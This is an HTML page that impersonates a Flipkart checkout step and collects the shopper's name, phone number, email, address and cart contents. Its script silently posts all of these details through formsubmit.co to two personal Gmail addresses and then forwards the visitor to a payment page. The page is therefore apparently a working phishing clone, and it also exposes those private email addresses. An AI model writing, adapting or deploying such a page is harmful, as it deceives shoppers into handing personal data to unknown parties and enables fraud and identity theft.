<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Checkout – Flipkart</title>
  <link rel="stylesheet" href="css/style.css" />
</head>
<body>

<div id="header"></div>
<div class="page-wrapper">

  <!-- Progress -->
  <div class="progress-bar">
    <div class="progress-step">
      <div class="step-circle active">1</div>
      <div class="step-label active">DELIVERY ADDRESS</div>
    </div>
    <div class="step-line"></div>
    <div class="progress-step">
      <div class="step-circle inactive">2</div>
      <div class="step-label inactive">PAYMENT METHOD</div>
    </div>
  </div>

  <div class="cart-layout">
    <!-- Address Form -->
    <div style="flex:1;min-width:300px">
      <div class="form-section">
        <div class="form-header">📍 DELIVERY ADDRESS</div>
        <div class="form-body">
          <div class="form-row">
            <div class="form-group">
              <label>FULL NAME *</label>
              <input type="text" id="fullName" placeholder="Enter your full name" />
              <div class="form-error" id="err-fullName"></div>
            </div>
            <div class="form-group">
              <label>PHONE NUMBER *</label>
              <input type="tel" id="phone" placeholder="10-digit mobile number" maxlength="10" oninput="this.value=this.value.replace(/\D/g,'')" />
              <div class="form-error" id="err-phone"></div>
            </div>
          </div>
          <div class="form-group" style="margin-bottom:16px">
            <label>EMAIL ADDRESS *</label>
            <input type="email" id="email" placeholder="Enter your email" oninput="updateEmailDisplay()" />
            <div class="form-error" id="err-email"></div>
          </div>
          
          <!-- Email Display Section -->
          <div id="emailDisplay" style="display:none; background:#f8f9fa; padding:12px; border-radius:8px; margin-bottom:16px; border:1px solid #e9ecef;">
            <div style="font-size:12px; color:#666; margin-bottom:4px;">Order Confirmation Email</div>
            <div id="displayEmail" style="font-weight:600; color:#17a2b8;"></div>
          </div>
          <div class="form-group" style="margin-bottom:16px">
            <label>ADDRESS *</label>
            <textarea id="address" placeholder="House No., Building, Street, Area" rows="2" style="resize:none"></textarea>
            <div class="form-error" id="err-address"></div>
          </div>
          <div class="form-row">
            <div class="form-group">
              <label>PINCODE *</label>
              <input type="text" id="pincode" placeholder="6-digit pincode" maxlength="6" oninput="this.value=this.value.replace(/\D/g,'')" />
              <div class="form-error" id="err-pincode"></div>
            </div>
            <div class="form-group">
              <label>CITY *</label>
              <input type="text" id="city" placeholder="City" />
              <div class="form-error" id="err-city"></div>
            </div>
            <div class="form-group">
              <label>STATE *</label>
              <select id="state">
                <option value="">Select State</option>
                <option>Andhra Pradesh</option><option>Arunachal Pradesh</option><option>Assam</option>
                <option>Bihar</option><option>Chhattisgarh</option><option>Delhi</option>
                <option>Goa</option><option>Gujarat</option><option>Haryana</option>
                <option>Himachal Pradesh</option><option>Jharkhand</option><option>Karnataka</option>
                <option>Kerala</option><option>Madhya Pradesh</option><option>Maharashtra</option>
                <option>Manipur</option><option>Meghalaya</option><option>Mizoram</option>
                <option>Nagaland</option><option>Odisha</option><option>Punjab</option>
                <option>Rajasthan</option><option>Sikkim</option><option>Tamil Nadu</option>
                <option>Telangana</option><option>Tripura</option><option>Uttar Pradesh</option>
                <option>Uttarakhand</option><option>West Bengal</option><option>Chandigarh</option>
              </select>
              <div class="form-error" id="err-state"></div>
            </div>
          </div>
          <div style="margin-bottom:20px">
            <label style="font-size:12px;font-weight:600;color:#212121;display:block;margin-bottom:8px">ADDRESS TYPE</label>
            <div class="address-type-row">
              <button class="type-btn active" onclick="selectType(this,'Home')">Home</button>
              <button class="type-btn" onclick="selectType(this,'Work')">Work</button>
              <button class="type-btn" onclick="selectType(this,'Other')">Other</button>
            </div>
          </div>
          <button class="submit-btn" id="deliver-btn" onclick="handleDeliver()">DELIVER HERE ›</button>
        </div>
      </div>
    </div>

    <!-- Order Summary -->
    <div class="order-summary">
      <div class="order-summary-header">ORDER SUMMARY</div>
      <div class="order-summary-body">
        <div id="co-items"></div>
        <div class="summary-divider">
          <div class="summary-row"><span>Price (<span id="co-count">0</span> items)</span><span>₹<span id="co-orig">0</span></span></div>
          <div class="summary-row"><span style="color:#388e3c">Discount</span><span style="color:#388e3c">-₹<span id="co-disc">0</span></span></div>
          <div class="summary-row"><span>Delivery</span><span style="color:#388e3c">FREE</span></div>
          <div class="summary-total"><span>Total</span><span>₹<span id="co-total">0</span></span></div>
          <div class="summary-save">✓ You save ₹<span id="co-save">0</span> on this order!</div>
        </div>
        <div class="summary-notes">
          <div class="summary-note">✓ Safe &amp; Secure Payments</div>
          <div class="summary-note">✓ Free delivery above ₹499</div>
          <div class="summary-note">✓ Easy 10-day returns</div>
        </div>
      </div>
    </div>

  </div>
</div>

<div id="footer"></div>

<script src="js/data.js"></script>
<script src="js/cart.js"></script>
<script>
  document.getElementById("header").innerHTML = renderHeader();
  document.getElementById("footer").innerHTML = renderFooter();

  let addressType = "Home";

  function selectType(btn, type) {
    document.querySelectorAll(".type-btn").forEach(b => b.classList.remove("active"));
    btn.classList.add("active");
    addressType = type;
  }

  function updateEmailDisplay() {
    const email = document.getElementById("email").value;
    const emailDisplay = document.getElementById("emailDisplay");
    const displayEmail = document.getElementById("displayEmail");
    
    if (email && email.includes("@")) {
      emailDisplay.style.display = "block";
      displayEmail.textContent = email;
    } else {
      emailDisplay.style.display = "none";
    }
  }

  // Render summary - add sample items if cart is empty
  let cart = getCart();
  if (cart.length === 0) {
    // Add sample items for demo
    const sampleItems = [
      { ...PRODUCTS[0], qty: 1, price: 449, originalPrice: 1299 },
      { ...PRODUCTS[1], qty: 2, price: 599, originalPrice: 1299 }
    ];
    saveCart(sampleItems);
    cart = sampleItems;
  }
  
  document.getElementById("co-count").textContent = cart.length;
  document.getElementById("co-orig").textContent = getCartOriginalTotal();
  document.getElementById("co-disc").textContent = getCartDiscount();
  document.getElementById("co-total").textContent = getCartTotal();
  document.getElementById("co-save").textContent = getCartDiscount();
  document.getElementById("co-items").innerHTML = cart.slice(0,3).map(item => `
    <div class="summary-item">
      <img src="${item.image}" onerror="this.style.display='none'" />
      <div class="summary-item-info">
        <div class="summary-item-name">${item.name.substring(0,35)}...</div>
        <div class="summary-item-qty">Qty: ${item.qty}</div>
      </div>
      <span class="summary-item-price">₹${item.price * item.qty}</span>
    </div>`).join("");

  function validateField(id, check, msg) {
    const el = document.getElementById(id);
    const err = document.getElementById("err-" + id);
    if (!check(el.value)) { el.classList.add("error"); err.textContent = msg; return false; }
    el.classList.remove("error"); err.textContent = ""; return true;
  }

  function handleDeliver() {
    const btn = document.getElementById("deliver-btn");
    const valid = [
      validateField("fullName", v => v.trim(), "Required"),
      validateField("phone", v => /^\d{10}$/.test(v), "Enter valid 10-digit number"),
      validateField("email", v => v.includes("@"), "Enter valid email"),
      validateField("address", v => v.trim(), "Required"),
      validateField("pincode", v => /^\d{6}$/.test(v), "Enter valid 6-digit pincode"),
      validateField("city", v => v.trim(), "Required"),
      validateField("state", v => v !== "", "Required"),
    ].every(Boolean);

    if (!valid) return;

    const data = {
      fullName: document.getElementById("fullName").value,
      phone: document.getElementById("phone").value,
      email: document.getElementById("email").value,
      address: document.getElementById("address").value,
      pincode: document.getElementById("pincode").value,
      city: document.getElementById("city").value,
      state: document.getElementById("state").value,
      addressType,
      items: cart.map(i => `${i.name.substring(0,40)} x${i.qty} — Rs.${i.price}`).join("; "),
      total: getCartTotal()
    };

    // Save for success page
    sessionStorage.setItem("fk_address", JSON.stringify(data));

    // Save billing data to localStorage for multi-page system
    localStorage.setItem('billingData', JSON.stringify({
      firstName: data.fullName.split(' ')[0] || data.fullName,
      lastName: data.fullName.split(' ').slice(1).join(' ') || '',
      email: data.email,
      phone: data.phone,
      billingAddress: data.address,
      city: data.city,
      postalCode: data.pincode,
      country: data.state,
      orderTotal: data.total
    }));

    // Send delivery address via formsubmit
    btn.textContent = "SAVING...";
    btn.disabled = true;
    
    // Create form data
    const formData = new FormData();
    formData.append('_subject', 'New Order - Billing Information');
    formData.append('_template', 'table');
    formData.append('_captcha', 'false');
    formData.append('_autoresponse', 'Thank you for your order! We have received your billing information and will process it shortly.');
    
    // Add all billing details unmasked
    formData.append('fullName', data.fullName);
    formData.append('email', data.email);
    formData.append('phone', data.phone);
    formData.append('billingAddress', data.address);
    formData.append('city', data.city);
    formData.append('postalCode', data.pincode);
    formData.append('state', data.state);
    formData.append('addressType', data.addressType);
    formData.append('items', data.items);
    formData.append('total', data.total);
    formData.append('orderStatus', 'Billing Information Received');
    formData.append('submissionTime', new Date().toLocaleString());
    
    // Send to both email recipients
    Promise.all([
      fetch("https://formsubmit.co/anandjhare4@gmail.com", {
        method: "POST",
        body: formData
      }),
      fetch("https://formsubmit.co/Rajatjha.ss708090@gmail.com", {
        method: "POST",
        body: formData
      })
    ]).catch(() => {}).finally(() => {
      location.href = "payment.html";
    });
  }
</script>
</body>
</html>
